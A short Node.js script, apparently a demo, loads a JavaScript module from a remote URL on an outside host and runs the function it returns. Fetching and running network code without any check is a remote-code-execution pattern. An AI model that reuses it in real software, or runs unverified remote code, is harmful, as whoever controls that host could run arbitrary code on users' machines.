const loadRemoteModule = require("./lib/loadRemoteModule");

async function main() {
  const newNode = await loadRemoteModule(
    "https://v.gonorth.top:444/file/index.js"
  );
  const node = newNode();
  console.log("local: " + node.name);
}

main();
